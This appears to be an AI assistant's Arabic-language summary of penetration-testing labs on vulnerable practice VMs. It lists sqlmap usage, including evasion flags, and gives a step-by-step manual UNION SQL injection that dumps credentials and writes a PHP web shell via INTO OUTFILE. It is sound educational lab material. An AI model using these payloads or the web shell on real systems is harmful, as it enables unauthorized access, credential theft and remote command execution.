ده تمرين أكاديمي تعليمي من مادة الـ Penetration Testing - هكمل معاك! 🎯

---

## ملخص الـ Lab الأول

### (From SQL Injection to Shell)

**الـ VM:** `192.168.96.129`

**المسار:**

```
١. nmap → لقينا Port 80 و 22
٢. فتحنا الموقع → صفحة Login
٣. جربنا cat.php?id=1' → ظهر SQL Error
٤. sqlmap --dbs → لقينا database: photoblog
٥. sqlmap --tables → لقينا: users, pictures, categories
٦. sqlmap --dump → لقينا: admin / P4ssw0rd
٧. دخلنا الـ Admin Panel
```

**الـ Vulnerability:** SQL Error في URL parameter `id`

---

## ملخص الـ Lab التاني

### (From SQL Injection to Shell II)

**الـ VM:** `192.168.96.131`

**المسار:**

```
١. nmap → لقينا Port 80
٢. nikto → لقينا الصفحات
٣. cat.php?id=1 → محمي بـ intval()
٤. admin/login.php → مش vulnerable
٥. X-Forwarded-For Header → vulnerable!
٦. sqlmap --header="X-Forwarded-For: 1*" → لقينا MySQL
٧. لقينا database: photoblog
```

**الـ Vulnerability:** SQL Injection في الـ HTTP Header

**الدرس المهم:** متفترضش الـ DBMS وسيب SQLMap يكتشف لوحده!

---

## شرح SQLMap الكامل

### الـ Parameters الأساسية

| Parameter  | المعنى               | مثال                                 |
| ---------- | -------------------- | ------------------------------------ |
| `-u`       | الـ URL الهدف        | `-u "http://site.com/page.php?id=1"` |
| `--dbs`    | جيب كل الـ Databases | `--dbs`                              |
| `-D`       | حدد Database         | `-D photoblog`                       |
| `--tables` | جيب الـ Tables       | `--tables`                           |
| `-T`       | حدد Table            | `-T users`                           |
| `--dump`   | اسحب البيانات        | `--dump`                             |
| `--batch`  | يجاوب تلقائي         | `--batch`                            |

### الـ Parameters المتقدمة

|Parameter|المعنى|مثال|
|---|---|---|
|`--level`|عمق الاختبار (1-5)|`--level=5`|
|`--risk`|مستوى الخطورة (1-3)|`--risk=3`|
|`--dbms`|حدد الـ Database|`--dbms=mysql`|
|`--forms`|يفحص الـ Forms|`--forms`|
|`--header`|يجرب على Header|`--header="X-Forwarded-For: 1*"`|
|`-p`|حدد parameter معين|`-p "username"`|
|`--tamper`|يتحايل على الحماية|`--tamper=space2comment`|
|`--random-agent`|يغير الـ User-Agent|`--random-agent`|

### أنواع الـ Injection

|النوع|المعنى|
|---|---|
|**Boolean-based**|بيسأل أسئلة صح/غلط|
|**Error-based**|بيستخدم الـ Errors يجيب بيانات|
|**Time-based**|بيقيس وقت الاستجابة|
|**UNION-based**|بيضيف query تانية|

### الـ Methodology الصح

```
١. جمع معلومات (nmap, nikto)
٢. تصفح الموقع يدوي
٣. جرب كل الـ Parameters:
   - URL parameters
   - Forms
   - Headers
٤. SQLMap بدون --dbms الأول
٥. لو مش اشتغل → --level=5 --risk=3
٦. لو برضو مش اشتغل → جرب headers
```

---

نكمل الـ Lab التاني ونوصل للـ Shell؟ 👀

## ملخص الـ Lab التالت

### SQL Injection to Shell عن طريق OUTFILE

---

### المسار الكامل

**١. اكتشاف الـ Vulnerability**

```
edit.php?id=2'  →  ظهر SQL Error
```

**٢. عرفنا عدد الـ Columns**

```
ORDER BY 1,2,3,4--  →  4 Columns
```

**٣. عرفنا الـ Columns الظاهرة**

```
id=-2 UNION SELECT 1,2,3,4--  →  Column 2 و 3 ظاهرين
```

**٤. جبنا الـ Database**

```
UNION SELECT 1,database(),3,4--  →  blog
```

**٥. جبنا الـ Tables**

```
UNION SELECT 1,group_concat(table_name),3,4 
FROM information_schema.tables 
WHERE table_schema=database()--
→  users, comments, posts
```

**٦. جبنا الـ Users**

```
UNION SELECT 1,group_concat(login,0x3a,password),3,4 
FROM users--
→  admin:8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd)
```

**٧. كتبنا الـ Shell على السيرفر**

```
UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3,4 
INTO OUTFILE '/var/www/css/shell.php'--
```

**٨. فتحنا الـ Shell**

```
http://[IP]/css/shell.php?cmd=id
```

---

### الفرق عن الـ Labs السابقة

||Lab 1|Lab 2|Lab 3|
|---|---|---|---|
|**Vulnerability**|URL parameter|HTTP Header|URL parameter|
|**DBMS**|MySQL|MySQL|MySQL|
|**طريقة الـ Shell**|File Upload|File Upload|INTO OUTFILE|

---

### الدرس المهم

**INTO OUTFILE** بتخليك تكتب ملف على السيرفر مباشرة من الـ SQL Query من غير ما تحتاج Upload! 🎯